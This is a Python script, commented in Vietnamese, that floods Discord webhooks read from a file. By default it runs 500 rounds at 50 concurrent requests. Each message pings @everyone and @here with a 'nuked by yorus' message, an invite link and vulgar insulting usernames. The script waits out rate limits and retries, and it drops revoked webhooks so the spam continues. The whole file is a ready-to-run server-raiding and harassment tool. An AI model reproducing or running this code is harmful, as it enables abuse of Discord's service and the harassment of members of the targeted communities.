import aiohttp
import asyncio
import random

# Đọc webhook từ file
with open("webhook_urls.txt", "r", encoding="utf-8") as f:
    webhook_urls = [line.strip() for line in f if line.strip()]

print(f"📨 Đọc được {len(webhook_urls)} webhook")

CONTENT = "### > ||@everyone @here|| nuked by yorus https://discord.com/invite/SjFshsTr2E"

# Danh sách tên ngẫu nhiên
RANDOM_NAMES = [
    "Yorus On Top", "Anti Nuke Như Con Cặc","Xoá Mẹ Server Đi","Fucked By Yorus","Server Ngu VL"
]

async def send_webhook(session, url, index, total, invalid_urls):
    # Kiểm tra nếu url đã bị invalid thì skip
    if url in invalid_urls:
        return False
    
    random_name = random.choice(RANDOM_NAMES) + "_" + str(random.randint(1000, 9999))
    
    payload = {
        "username": random_name,
        "content": CONTENT,
        "allowed_mentions": {"parse": ["everyone", "users", "roles"]}
    }
    
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in [204, 200]:
                print(f"✅ [{index}/{total}] Thành công - Tên: {random_name}")
                return True
            elif resp.status == 401:
                print(f"❌ [{index}/{total}] Unauthorized (401) - Bỏ qua webhook này")
                invalid_urls.add(url)
                return False
            elif resp.status == 429:
                data = await resp.json()
                retry_after = data.get("retry_after", 1)
                print(f"⏳ [{index}/{total}] Rate limit, chờ {retry_after}s")
                await asyncio.sleep(retry_after + 0.5)
                async with session.post(url, json=payload) as retry_resp:
                    if retry_resp.status in [204, 200]:
                        print(f"✅ [{index}/{total}] Thành công (retry) - Tên: {random_name}")
                        return True
                    elif retry_resp.status == 401:
                        print(f"❌ [{index}/{total}] Unauthorized (401) - Bỏ qua webhook này")
                        invalid_urls.add(url)
                        return False
                    else:
                        print(f"❌ [{index}/{total}] Lỗi retry: {retry_resp.status}")
                        return False
            else:
                print(f"❌ [{index}/{total}] Lỗi: {resp.status}")
                return False
    except Exception as e:
        print(f"❌ [{index}/{total}] Exception: {e}")
        return False

async def spam_webhooks(times=5, concurrent=10):
    """Spam nhiều lần với concurrent"""
    semaphore = asyncio.Semaphore(concurrent)
    invalid_urls = set()  # Lưu các webhook bị 401
    
    async def limited_send(session, url, idx, total):
        async with semaphore:
            return await send_webhook(session, url, idx, total, invalid_urls)
    
    async with aiohttp.ClientSession() as session:
        total_webhooks = len(webhook_urls)
        active_webhooks = total_webhooks
        
        for round_num in range(1, times + 1):
            print(f"\n🔁 Lần {round_num}/{times}")
            print(f"📌 Webhook hoạt động: {active_webhooks}/{total_webhooks}")
            
            tasks = []
            for idx, url in enumerate(webhook_urls, 1):
                task = limited_send(session, url, idx, total_webhooks)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r)
            
            # Cập nhật số webhook hoạt động
            active_webhooks = total_webhooks - len(invalid_urls)
            
            print(f"📊 Lần {round_num}: {success}/{total_webhooks} thành công")
            print(f"🚫 Webhook bị bỏ qua (401): {len(invalid_urls)}")
            
            # Nếu tất cả webhook đều bị 401 thì dừng
            if active_webhooks == 0:
                print("\n⚠️ Tất cả webhook đều bị Unauthorized (401). Dừng spam!")
                break
        
        print(f"\n✅ Hoàn thành! Tổng: {times * total_webhooks} lần gửi")
        print(f"🚫 Tổng webhook bị bỏ qua: {len(invalid_urls)}")

if __name__ == "__main__":
    asyncio.run(spam_webhooks(times=500, concurrent=50))
